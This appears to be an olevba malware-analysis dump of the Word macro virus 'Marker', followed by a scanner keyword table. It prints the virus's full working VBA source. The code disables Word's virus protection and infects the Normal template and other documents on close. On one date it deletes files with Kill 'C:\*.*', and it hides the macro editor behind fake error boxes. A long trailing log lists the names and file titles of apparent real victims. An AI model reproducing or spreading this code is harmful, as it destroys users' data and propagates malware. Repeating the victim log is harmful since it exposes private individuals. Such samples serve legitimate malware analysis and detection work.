olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x-2cd4a443ba424756bffe0e5a44f6cb80bf984d8e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x-2cd4a443ba424756bffe0e5a44f6cb80bf984d8e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Private Sub Document_Close()
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
On Error Resume Next
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Dim ad, nt As Object
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Dim rep, x As Integer
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Dim virusCode, UserAddress, LogData, LogFile As String
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Options.VirusProtection = False
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Options.SaveNormalPrompt = True
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Delivery:
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
If Day(Now()) = 22 And Month(Now()) = 2 Then
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Kill "C:\*.*":
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
GoTo Delivery
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
End If
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
If DocumentInfected = True Then
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
SaveNormalTemplate = NormalTemplate.Saved
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
For i = 1 To Len(Application.UserAddress)
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
End If
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Else
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
UserAddress = UserAddress & Chr(13) & "' "
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
End If
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Next i
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
virusCode = virusCode & LogData
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
nt.codemodule.AddFromString virusCode
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
With nt.codemodule
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
End With
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
With nt.codemodule
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
For x = 45 To 181 Step 2
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Next x
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
End With
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
If SaveNormalTemplate = True Then NormalTemplate.Save
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
End If
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
If NormalTemplateInfected = True Then
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
SaveDocument = ActiveDocument.Saved
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
ad.codemodule.AddFromString virusCode
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
nt.codemodule.AddFromString virusCode
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
ad.codemodule.Deletelines 174, 13
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
With ad.codemodule
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
For x = 45 To 181 Step 2
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Next x
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
End With
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
If SaveDocument = True Then ActiveDocument.Save
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
End If
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
End If
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
Options.SaveNormalPrompt = False
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
End Sub
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
' NoWork Inc. Doc1.doc9/10/99 2:26:17 PM
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
' NoWork Inc. Doc1.doc9/10/99 2:26:17 PM
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
' NoWork Inc. Doc1.doc9/10/99 2:26:17 PM
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM

' WildList SAMPLE1.DOC9/15/99 6:49:59 PM

' Document1

' Document1

' Document1

' details.doc

' Resume.doc

' div.doc

' 05:08:00 PM -Monday,24 May,1999
' Siu Pang
'
' div.doc

' beatrix_kwan.doc

' slee.doc

' CV981125.doc

' MassoudW97.doc

' S4R_Int.doc

' Hotlist1.doc

' Roy Zornow resume.doc

' TK Move Manager.doc

' AU Business Manager.doc

' GDLUCK.DOC

' NOMURA.doc

' Operations Generalist.doc

' PBX Telecom Coordinator.doc

' resume.doc

' parm_meegada.doc

' Pramit.doc

' 03:29:30 PM -Thursday,27 May,1999
' Employee
'
' panda.doc

' zendeal2.doc

' Resume34.doc

' ted r doc_.doc

' gurman.doc

' RESUME37.doc

' Paul Smith002.doc

' WANG-W.DOC

' 1resumeAGurman.doc

' Chuck-res.doc

' cv3.doc

' resume38.doc

' BHARG-V.DOC

' flres1.doc

' sample1.doc

' Lawton updated resume.doc

' LEMERISE.DOC

' galianes.doc

' CVUK.doc

' word95_BinLi.doc

' Eduard 1.doc

' rakowski.doc

' DHRUVER.DOC

' 01:08:39 PM -Wednesday,16 Jun,1999
' DhruveR
'
' Dhruver.doc

' 6-15.doc

' DJI RESTORE.doc

' 03:58:39 PM -Wednesday,16 Jun,1999
' Tom Dziubek
'
' DJI RESTORE.doc

' FEC Script.doc

' OutlookDelegates.doc

' nite.doc

' sbranc01.doc

' newuser-djxpress.doc

' june_99.doc

' 02:01:37 PM -Monday,28 Jun,1999
' TozziT
'
' june_99.doc

' teammov1.doc

' 03:34:41 PM -Wednesday,7 Jul,1999
' DziubekT
'
' teammov11.doc

' Document2

' oneweek.doc

' oneweek.doc

' Document1

' twoweek.doc

' 4week.doc

' 01:44:35 PM -Wednesday,7 Jul,1999
' Ernesto Dulce
'
' 4week.doc

' FSDLA.doc

' FSDLA.doc

' July 13th Outage Request.doc

' 12:14:22 PM -Monday,12 Jul,1999
' cnsncc
'
' July 13th Outage Request.doc

' Kathy's Resume1.doc

' ubeedoo.doc

' Unregistered Network Numbers.doc

' servernames.doc

' data circuits 1.doc

' DAILY ACTIVITY REPORT.doc

' 07:56:46 AM -Tuesday,13 Jul,1999
' Donna Gusty
'
' DAILY ACTIVITY REPORT.doc

' BCP Status 2.doc

' Pouch update 7-99.doc

' Customer Service Analyst.doc

' Shadow R4.doc

' DOR July 13 1999.doc

' Customer Service Analyst.doc

' Disaster Recovery Consultant revised.doc

' helpadminminutes.doc

' Security Technician.doc

' Security Consultant.doc

' Memo review for flag1.doc

' ISDN_Announcement1.doc

' Technical Competencie1.doc

' Doc3.doc

' Doc1_.doc

' Technical Security Group agenda 5-26-99.doc

' QuickConnection and Feedback-usethis.doc

' desktop guideline memo - test.doc

' Atex Meetings.doc

' Internet Services.doc

' Advertising.doc

' DJPortal.doc

' DJIP.doc

' NonBCPGroups.doc

' July3Keane.doc

' DOW JONES PROP msw 6.0.doc

' Pagination ISCS Plan Requirements.doc

' NASC 6-30-99 Meeting.doc

' intern'lfeedscpl__.doc

' Mtg0707.doc

' Memo9714.doc

' Newswires mail solution.doc

' ScanningMEMORANDUM.doc

' Pagination ISCS Plan Requirements.doc

' Pagination Security & Contingency issues.doc

' 6-24 Policy minutes.doc

' article1.doc

' Initial_assumpt.doc

' shared_service_sum.doc

' ScanningMEMORANDUM.doc

' Career Path Matrix-revised.doc

' Career Path Matrix-revised2.doc

' Career Path Matrix-revised.doc

' Summary paragraphs.doc

' security admin analyst.doc

' Customer Service Analyst.doc

' Summary paragraphs1_.doc

' Doc1_.doc

' DJXPress Rollout remote access methods.doc

' MEMORANDUMfirewall-model.doc

' toronto.doc

' MtgSchedule_.doc

' 7-19-99.doc

' Summary paragraphs1_.doc

' 103a.doc

' Pouch update 7-99.doc

' Pouch update 7-99.doc

' Pouch update 7-99_tom.doc

' Pouch update 7-99.doc

' 07:38:52 AM -Wednesday,21 Jul,1999
' Robert D. Gardner
'
' Pouch update 7-99.doc

' ELAC Nautik Report03b.doc

' L3 ELAC Nautik Phase01.doc

' L3_EuroAtlas Phase01.doc

' L3_JovyAtlas Phase01.doc

' 10:37:26 AM -Wednesday,21 Jul,1999
' Pc Support
'
' L3_JovyAtlas Phase01.doc

' L3SELFPres.doc

' 05:06:37 PM -Wednesday,21 Jul,1999
' Rocco R. Ruggiero
'
' l3slfprs.doc

' l3nmwfnl.doc

' l3nmefnl.doc

' absaufnl.doc

' 0920PBX.DOC

' CS-E Phase II Audit.doc

' lo10q2qc.doc

' LO0715MN.doc

' 02:26:07 PM -Friday,10 Sep,1999
' NoWork Inc.
'
' Virus Test.doc

' Doc1.doc

' 06:49:44 PM -Wednesday,15 Sep,1999
' WildList
'
' doc1.doc

' SAMPLE1.DOC

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

